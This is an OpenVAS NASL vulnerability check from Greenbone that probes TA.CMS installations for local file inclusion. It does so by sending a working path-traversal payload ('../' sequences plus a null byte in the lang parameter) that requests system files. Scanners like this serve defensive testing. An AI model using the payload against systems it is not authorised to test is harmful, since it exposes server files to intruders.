###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ta.cms_50773.nasl 5751 2017-03-28 14:37:16Z cfi $
#
# TA.CMS Local File Include and SQL Injection Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "TA.CMS is prone to multiple local file-include and SQL-injection
vulnerabilities.

An attacker can exploit these issues to compromise the application,
access or modify data, exploit latent vulnerabilities in the
underlying database, and view and execute arbitrary local files within
the context of the webserver.";

if(description)
{
 script_id(103346);
 script_bugtraq_id(50773);
 script_version ("$Revision: 5751 $");
 script_name("TA.CMS Local File Include and SQL Injection Vulnerabilities");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"last_modification", value:"$Date: 2017-03-28 16:37:16 +0200 (Tue, 28 Mar 2017) $");
 script_tag(name:"creation_date", value:"2011-11-24 10:43:43 +0100 (Thu, 24 Nov 2011)");
 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50773");
 script_xref(name : "URL" , value : "http://www.teacharabia.com/?module=solutions&page=details&id=30");
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

files = traversal_files();

foreach dir( make_list_unique( "/cms", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach file (keys(files)) {
   
    url = string(dir, "/?lang=",crap(data:"../",length:9*3),files[file],"%00.png&amp;p_id=60"); 

    if(http_vuln_check(port:port, url:url,pattern:file)) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );